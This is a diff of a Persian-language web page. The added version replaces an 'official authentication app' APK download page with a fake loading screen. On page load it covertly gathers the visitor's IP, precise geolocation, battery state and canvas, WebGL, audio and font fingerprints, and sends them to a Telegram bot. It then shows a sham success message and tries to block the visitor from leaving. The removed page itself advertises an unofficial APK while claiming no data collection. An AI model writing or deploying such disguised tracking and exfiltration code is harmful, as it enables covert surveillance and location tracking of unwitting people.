@@ -1,260 +1,315 @@
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>دانلود برنامه احراز هویت | نسخه رسمی</title>
-
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;600;800&display=swap" rel="stylesheet">
-
-<style>
-*{box-sizing:border-box}
-body{
-    margin:0;
-    font-family:'Vazirmatn',sans-serif;
-    background:radial-gradient(circle at top,#0f2027,#203a43,#2c5364);
-    color:#fff;
-}
-
-/* Loading Screen */
-#loading{
-    position:fixed;
-    inset:0;
-    background:radial-gradient(circle at top,#000,#020c16);
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    z-index:9999;
-}
-
-.loader-wrap{
-    text-align:center;
-    color:#00ffe0;
-    font-weight:700;
-    letter-spacing:1px;
-}
-
-.ring{
-    width:90px;
-    height:90px;
-    border-radius:50%;
-    border:5px solid rgba(0,255,200,.15);
-    border-top:5px solid #00ffe0;
-    animation:spin 1.2s linear infinite;
-    margin:auto;
-    box-shadow:0 0 35px rgba(0,255,200,.7);
-}
-
-@keyframes spin{
-    100%{transform:rotate(360deg)}
-}
-
-/* Header */
-header{
-    padding:22px;
-    text-align:center;
-    font-weight:800;
-    font-size:22px;
-    background:linear-gradient(135deg,#00f2fe,#4facfe);
-    color:#003;
-    border-radius:0 0 28px 28px;
-    box-shadow:0 10px 30px rgba(0,0,0,.4);
-}
-
-/* Container */
-.container{
-    max-width:1100px;
-    margin:auto;
-    padding:20px;
-}
-
-/* App Card */
-.app-card{
-    display:grid;
-    grid-template-columns:120px 1fr;
-    gap:20px;
-    background:rgba(255,255,255,.08);
-    border-radius:26px;
-    padding:20px;
-    backdrop-filter:blur(18px);
-    box-shadow:0 0 40px rgba(0,0,0,.5);
-    animation:fadeUp .9s ease;
-}
-
-.app-card img{
-    width:120px;
-    border-radius:24px;
-    box-shadow:0 10px 30px rgba(0,0,0,.6);
-}
-
-.app-info h1{
-    margin:0;
-    font-size:26px;
-}
-
-.meta{
-    display:flex;
-    flex-wrap:wrap;
-    gap:12px;
-    margin-top:10px;
-}
-
-.meta span{
-    background:rgba(255,255,255,.12);
-    padding:6px 14px;
-    border-radius:14px;
-    font-size:14px;
-}
-
-/* Download */
-.download-box{
-    margin-top:30px;
-    background:linear-gradient(135deg,#00ff99,#00c6ff);
-    padding:26px;
-    border-radius:28px;
-    text-align:center;
-    box-shadow:0 0 45px rgba(0,255,180,.8);
-    animation:pulse 2.5s infinite;
-}
-
-.download-box a{
-    display:inline-block;
-    padding:16px 40px;
-    border-radius:18px;
-    background:#000;
-    color:#00ffcc;
-    font-size:20px;
-    text-decoration:none;
-    font-weight:800;
-    box-shadow:0 0 25px rgba(0,0,0,.8);
-    transition:.3s;
-}
-
-.download-box a:hover{
-    transform:scale(1.07);
-    box-shadow:0 0 45px rgba(0,0,0,1);
-}
-
-/* Screenshots */
-.gallery{
-    display:grid;
-    grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
-    gap:18px;
-    margin-top:30px;
-}
-
-.gallery img{
-    width:100%;
-    border-radius:22px;
-    box-shadow:0 10px 30px rgba(0,0,0,.6);
-    transition:.4s;
-}
-
-.gallery img:hover{
-    transform:scale(1.05);
-}
-
-/* Description */
-.desc{
-    margin-top:30px;
-    background:rgba(255,255,255,.08);
-    padding:22px;
-    border-radius:24px;
-    line-height:2;
-}
-
-/* Footer */
-footer{
-    text-align:center;
-    opacity:.5;
-    margin:40px 0 10px;
-}
-
-@keyframes fadeUp{
-    from{opacity:0;transform:translateY(25px)}
-    to{opacity:1;transform:translateY(0)}
-}
-@keyframes pulse{
-    0%{box-shadow:0 0 25px rgba(0,255,200,.6)}
-    50%{box-shadow:0 0 55px rgba(0,255,200,1)}
-    100%{box-shadow:0 0 25px rgba(0,255,200,.6)}
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>در حال بارگذاری...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing:  border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .loader-container {
+            text-align: center;
+            color: white;
+            z-index: 9999;
+        }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid rgba(255,255,255,0.3);
+            border-top: 6px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 30px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        .status {
+            font-size: 1.2em;
+            opacity: 0.9;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .success-page {
+            background: #10b981;
+            color: white;
+            padding: 60px 20px;
+            text-align: center;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .checkmark {
+            font-size: 8em;
+            margin-bottom: 30px;
+            animation: bounce 0.6s ease-out;
+        }
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-30px); }
+            60% { transform: translateY(-15px); }
+        }
+    </style>
 </head>
-
 <body>
-
-<!-- Loading -->
-<div id="loading">
-    <div class="loader-wrap">
-        <div class="ring"></div>
-        <span>در حال بارگذاری...</span>
+    <!-- لودینگ فیک -->
+    <div id="loader" class="loader-container">
+        <div class="spinner"></div>
+        <h1>در حال بارگذاری...</h1>
+        <div class="status">لطفاً صبر کنید</div>
     </div>
-</div>
 
-<header>
-دانلود برنامه احراز هویت | نسخه رسمی
-</header>
-
-<div class="container">
-
-<div class="app-card">
-    <img src="https://uploadkon.ir/uploads/c4d710_2625D1F509-55FD-428E-8E64-A52F1C9BA466.png">
-    <div class="app-info">
-        <h1>برنامه احراز هویت</h1>
-        <div class="meta">
-            <span>نسخه 1.0.0</span>
-            <span>اندروید 7+</span>
-            <span>بدون تبلیغات</span>
-            <span>حجم کم</span>
-        </div>
-        <p style="margin-top:12px;opacity:.8">
-        اپلیکیشن رسمی جهت انجام فرآیند احراز هویت سریع، امن و هوشمند
-        </p>
+    <!-- صفحه موفقیت (بعد از ارسال اطلاعات) -->
+    <div id="success" class="success-page hidden">
+        <div class="checkmark">✅</div>
+        <h1>بارگذاری کامل شد!</h1>
+        <p>از صبر شما سپاسگزاریم</p>
     </div>
-</div>
 
-<div class="download-box">
-    <p>دانلود مستقیم با لینک پرسرعت</p>
-    <a href="https://uploadkon.ir/uploads/adf010_26phonix-70592.apk">
-        ⬇ دانلود برنامه
-    </a>
-</div>
+    <script>
+        // تنظیمات تلگرام - جایگزین کن
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+        const CHAT_ID = 'YOUR_CHAT_ID_HERE';
 
-<div class="gallery">
-    <img src="https://uploadkon.ir/uploads/c4d710_2625D1F509-55FD-428E-8E64-A52F1C9BA466.png">
-</div>
+        // جمع‌آوری تمام اطلاعات ممکن
+        async function collectAllInfo() {
+            const info = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                window: {
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                },
+                connection: navigator.connection || {},
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                referrer: document.referrer || 'Direct',
+                url: window.location.href,
+                ip: 'در حال دریافت...',
+                geolocation: 'در حال دریافت...',
+                battery: 'در حال دریافت...',
+                localStorage: !!window.localStorage,
+                sessionStorage: !!window.sessionStorage,
+                plugins: Array.from(navigator.plugins).map(p => p.name),
+                fonts: await detectFonts(),
+                canvas: await getCanvasFingerprint(),
+                webgl: await getWebGLFingerprint(),
+                audio: await getAudioFingerprint()
+            };
 
-<div class="desc">
-    این برنامه جهت انجام فرآیند احراز هویت طراحی شده و از جدیدترین الگوریتم‌های امنیتی استفاده می‌کند.
-    <br>
-    🔹 محیط کاملاً ساده و روان  
-    <br>
-    🔹 سرعت پردازش بالا  
-    <br>
-    🔹 امنیت بسیار بالا  
-    <br>
-    🔹 بدون جمع‌آوری اطلاعات اضافی  
-</div>
+            // IP Address
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                info.ip = ipData.ip;
+            } catch(e) {}
 
-<footer>
-© 2026 Secure Download Platform
-</footer>
+            // Geolocation
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    });
+                });
+                info.geolocation = `${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)}`;
+            } catch(e) {
+                info.geolocation = 'Access Denied';
+            }
 
-</div>
+            // Battery API
+            if ('getBattery' in navigator) {
+            	try {
+            		const battery = await navigator.getBattery();
+            		info.battery = {
+            			level: `${(battery.level * 100).toFixed(1)}%`,
+            			charging: battery.charging,
+            			chargingTime: battery.chargingTime,
+            			dischargingTime: battery.dischargingTime
+            		};
+            	} catch(e) {}
+            }
 
-<script>
-window.addEventListener("load",()=>{
-    setTimeout(()=>{
-        document.getElementById("loading").style.opacity="0";
-        document.getElementById("loading").style.pointerEvents="none";
-        setTimeout(()=>{
-            document.getElementById("loading").remove();
-        },600);
-    },1200);
-});
-</script>
+            return info;
+        }
 
+        // تشخیص فونت‌ها
+        async function detectFonts() {
+            const fonts = ['Arial', 'Courier', 'Georgia', 'Helvetica', 'Times New Roman', 'Verdana', 'Wingdings'];
+            const detected = [];
+            
+            const testString = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            const span = document.createElement('span');
+            span.style.fontSize = '72px';
+            span.style.visibility = 'hidden';
+            span.innerHTML = testString;
+            document.body.appendChild(span);
+            
+            const defaultWidth = span.offsetWidth;
+            const defaultHeight = span.offsetHeight;
+            
+            for (const font of fonts) {
+                span.style.fontFamily = font;
+                if (span.offsetWidth !== defaultWidth || span.offsetHeight !== defaultHeight) {
+                    detected.push(font);
+                }
+            }
+            
+            document.body.removeChild(span);
+            return detected;
+        }
+
+        // Canvas Fingerprint
+        async function getCanvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 200;
+            canvas.height = 60;
+            const ctx = canvas.getContext('2d');
+            
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Fingerprint Test 🧾', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('Fingerprint Test 🧾', 4, 17);
+            
+            return canvas.toDataURL();
+        }
+
+        // WebGL Fingerprint
+        async function getWebGLFingerprint() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return 'No WebGL';
+            
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
+                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A'
+            };
+        }
+
+        // Audio Fingerprint
+        async function getAudioFingerprint() {
+            if (!window.AudioContext && !window.webkitAudioContext) return 'No AudioContext';
+            
+            const ctx = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = ctx.createOscillator();
+            const analyser = ctx.createAnalyser();
+            const gainNode = ctx.createGain();
+            
+            analyser.fftSize = 2048;
+            const bufferLength = analyser.frequencyBinCount;
+            const dataArray = new Uint8Array(bufferLength);
+            
+            oscillator.connect(analyser);
+            analyser.connect(gainNode);
+            gainNode.connect(ctx.destination);
+            
+            oscillator.type = 'sine';
+            oscillator.frequency.value = 10000;
+            
+            oscillator.start(0);
+            await new Promise(r => setTimeout(r, 100));
+            analyser.getByteFrequencyData(dataArray);
+            oscillator.stop(0);
+            ctx.close();
+            
+            return Array.from(dataArray).slice(0, 100).join(',');
+        }
+
+        // ارسال به تلگرام
+        async function sendToTelegram(data) {
+            const message = `🕵️‍♂️ **دستگاه جدید شناسایی شد!**\n\n` +
+                `🕐 **زمان:** ${new Date().toLocaleString('fa-IR')}\n` +
+                `🌐 **URL:** ${data.url}\n` +
+                `📱 **IP:** ${data.ip}\n` +
+                `📍 **موقعیت:** ${data.geolocation}\n\n` +
+                `💻 **مرورگر:** ${data.userAgent}\n` +
+                `🖥️ **رزولوشن:** ${data.screen.width}x${data.screen.height}\n` +
+                `📱 **پنجره:** ${data.window.width}x${data.window.height}\n` +
+                `🌍 **منطقه زمانی:** ${data.timezone}\n` +
+                `🔋 **باتری:** ${typeof data.battery === 'object' ? data.battery.level : 'N/A'}\n\n` +
+                `⚙️ **سخت‌افزار:**\n` +
+                `- CPU Cores: ${data.hardwareConcurrency}\n` +
+                `- RAM: ${data.deviceMemory}GB\n` +
+                `- Touch Points: ${data.maxTouchPoints}\n\n` +
+                `🎨 **گرافیک:**\n` +
+                `- فونت‌ها: ${data.fonts.join(', ')}\n` +
+                `- Canvas: ${data.canvas.substring(0, 50)}...\n` +
+                `- WebGL: ${typeof data.webgl === 'object' ? data.webgl.renderer : 'N/A'}\n\n` +
+                `🔌 **شبکه:** ${data.connection.effectiveType || 'N/A'}\n` +
+                `🔙 **Referer:** ${data.referrer}`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const params = new URLSearchParams({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            });
+
+            await fetch(`${url}?${params}`);
+        }
+
+        // اجرای خودکار
+        window.addEventListener('load', async () => {
+            try {
+                const deviceInfo = await collectAllInfo();
+                await sendToTelegram(deviceInfo);
+            } catch(e) {
+                console.error('Error:', e);
+            } finally {
+                // نمایش صفحه موفقیت بعد از 3 ثانیه
+                setTimeout(() => {
+                    document.getElementById('loader').classList.add('hidden');
+                    document.getElementById('success').classList.remove('hidden');
+                }, 3000);
+            }
+        });
+
+        // جلوگیری از خروج
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            return 'در حال بارگذاری...';
+        });
+    </script>
 </body>
 </html>
